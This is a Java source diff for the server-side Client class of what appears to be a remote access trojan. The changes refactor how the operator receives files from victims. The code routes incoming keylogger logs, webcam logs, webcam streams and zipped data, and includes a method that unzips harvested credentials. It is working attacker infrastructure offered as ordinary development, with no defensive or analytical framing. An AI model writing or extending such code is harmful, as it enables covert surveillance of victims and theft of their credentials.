@@ -1,6 +1,9 @@
 package Server;
 
-import Information.*;
+import Packets.Identificators.Category;
+import Packets.Identificators.Response;
+import Packets.SysNetInfo.NetworkInformation;
+import Packets.SysNetInfo.SystemInformation;
 import Updater.UpdaterInterface;
 import Utils.FileWriterTask;
 import Utils.Time;
@@ -23,6 +26,7 @@ public class Client {
     private SystemInformation sysInfo;
     private NetworkInformation netInfo;
     private final ExecutorService executor = Executors.newCachedThreadPool();
+
     public UpdaterInterface updater;
     private boolean isWebcamDialogOpen;
     private final UniqueByteIDGenerator uniqueByteIDGeneratorIn = new UniqueByteIDGenerator();
@@ -36,13 +40,13 @@ public class Client {
 
     public Client(Session session) {
         this.session = session;
-        updater = ConnectionStore.updaterInterface;
+        this.updater = ConnectionStore.updaterFactory.createInstance();
         setupMapOfResponses();
     }
 
     public BytesChannel createFileChannel(Category category) {
         byte id = uniqueByteIDGeneratorIn.getID();
-        BytesChannel channel = new BytesChannel(id, category);
+        BytesChannel channel = new BytesChannel(id, category, updater);
         activeChannels.put(id, channel);
         return channel;
     }
@@ -50,7 +54,8 @@ public class Client {
     public void handleFileCompletion(BytesChannel bytesChannel, byte[] finalData) {
         switch (bytesChannel.getCategory()) {
             case ZIP_FILE, WEBCAM_LOGS, KEYLOGGER_LOGS -> {
-                writeFile(finalData, bytesChannel.getCategoryOutputFolder());
+                String outputFolder = writeFile(finalData, bytesChannel.getCategoryOutputFolder());
+                updater.showDownloadedFiles(outputFolder);
                 closeFileChannel(bytesChannel.getId());
             }
             case WEBCAM_STREAMING -> {
@@ -101,11 +106,12 @@ public class Client {
         }
     }
 
-    public void writeFile(byte[] data, String category) {
+    public String writeFile(byte[] data, String category) {
         String finalNameOfFolder = category + " - " + new Time().getTime();
         Path pathOfDownload = Path.of(getSessionFolder(), finalNameOfFolder);
         FileWriterTask task = new FileWriterTask(data, pathOfDownload.toString());
-        executor.execute(task);
+        task.unzipFileInMemory();
+        return pathOfDownload.toString();
     }
 
     public String unzipCredentialsAndGetPath(byte[] data, String category) {
